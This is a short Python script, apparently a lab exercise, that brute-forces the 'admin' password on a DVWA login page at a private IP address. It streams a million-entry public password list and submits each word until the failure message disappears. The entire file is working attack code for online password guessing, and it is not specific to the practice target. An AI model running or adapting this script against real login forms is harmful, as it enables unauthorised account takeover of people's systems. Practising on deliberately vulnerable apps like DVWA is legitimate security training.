#!/usr/bin/env python

import requests
import urllib2
import sys

target_url = "http://172.16.143.128/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}
dictionary_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"

for line in urllib2.urlopen(dictionary_url):
    word = line.strip()
    data_dict["password"] = word
    response = requests.post(target_url, data=data_dict)
    print("\r" + word + "     ")
    sys.stdout.flush()
    if "Login failed" not in response.content:
            print("[+] I have the password --> " + word)
            exit()

print("[-] Reached end of the line :(")

